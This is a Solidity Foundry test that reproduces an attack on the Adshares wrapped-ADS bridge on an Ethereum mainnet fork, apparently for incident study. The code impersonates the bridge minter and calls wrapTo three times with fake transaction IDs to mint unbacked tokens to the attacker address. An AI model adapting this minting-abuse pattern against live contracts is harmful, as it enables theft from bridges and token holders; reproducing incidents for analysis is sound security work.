// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
// @KeyInfo - Total Lost : ~$628K
// Attacker : https://etherscan.io/address/0x63e22ce9bde9bb8892a447258abfcaa4142f001b
// Attack Contract : N/A 
// Vulnerable Contract : https://etherscan.io/address/0xcfcEcFe2bD2FED07A9145222E8a7ad9Cf1Ccd22A
// Attack Tx : https://etherscan.io/tx/0x8844b4ec371c4b13d7fac701b5d546a7c2fba12621a9596dd14b662b14408789
// Attack Tx 2 : https://etherscan.io/tx/0xfba82bb34515d7aefbf0c89582b71d915ec8861c96babaafdc882743dbc23509
// Attack Tx 3 : https://etherscan.io/tx/0xa3476575183204b4a662dd6ee56f6499d806e4f41ce83d98366752d31e9e9ca3
//
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xcfcEcFe2bD2FED07A9145222E8a7ad9Cf1Ccd22A#code
//
// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/DefimonAlerts/status/2055751467579936770

contract AdsharesBridgeTest is Test {
    bytes32 internal constant TX_HASH = 0x8844b4ec371c4b13d7fac701b5d546a7c2fba12621a9596dd14b662b14408789;

    address internal constant BRIDGE_MINTER = 0xF54aF6D4d18C8d61F504E530C127eaa05E011414;
    address internal constant ATTACKER = 0x63e22Ce9Bde9bb8892a447258abfCaa4142f001B;
    IWrappedADS internal constant WADS = IWrappedADS(0xcfcEcFe2bD2FED07A9145222E8a7ad9Cf1Ccd22A);

    uint64 internal constant FAKE_NATIVE_FROM = 0x000300000025ab2b;
    uint64 internal constant FAKE_TXID_1 = 0x00030000b8460001;
    uint64 internal constant FAKE_TXID_2 = 0x00030000b8470001;
    uint64 internal constant FAKE_TXID_3 = 0x00030000b8490001;

    uint256 internal constant FIRST_FAKE_MINT = 9_999_993_317_172_301;
    uint256 internal constant SECOND_FAKE_MINT = 9_999_993_317_172_301;
    uint256 internal constant THIRD_FAKE_MINT = 99_999_994_319_920_782;
    uint256 internal constant TOTAL_FAKE_MINT = 119_999_980_954_265_384;

    function setUp() public {
        vm.createSelectFork("mainnet", TX_HASH);
        vm.label(BRIDGE_MINTER, "Bridge Minter");
        vm.label(ATTACKER, "Attacker");
        vm.label(address(WADS), "Wrapped ADS");
    }

    function testExploit() public {
        uint256 beforeAds = WADS.balanceOf(ATTACKER);
        uint256 beforeMinterAllowance = WADS.minterAllowance(BRIDGE_MINTER);

        vm.startPrank(BRIDGE_MINTER, BRIDGE_MINTER);
        require(WADS.wrapTo(ATTACKER, FIRST_FAKE_MINT, FAKE_NATIVE_FROM, FAKE_TXID_1), "first fake mint failed");
        require(WADS.wrapTo(ATTACKER, SECOND_FAKE_MINT, FAKE_NATIVE_FROM, FAKE_TXID_2), "second fake mint failed");
        require(WADS.wrapTo(ATTACKER, THIRD_FAKE_MINT, FAKE_NATIVE_FROM, FAKE_TXID_3), "third fake mint failed");
        vm.stopPrank();

        uint256 mintedAds = WADS.balanceOf(ATTACKER) - beforeAds;
        assertEq(mintedAds, TOTAL_FAKE_MINT);
        assertEq(beforeMinterAllowance - WADS.minterAllowance(BRIDGE_MINTER), TOTAL_FAKE_MINT);

        console.log("Stolen wADS", mintedAds);
    }
}

interface IWrappedADS {
    function balanceOf(address account) external view returns (uint256);
    function minterAllowance(address minter) external view returns (uint256);
    function wrapTo(address account, uint256 amount, uint64 from, uint64 txid) external returns (bool);
}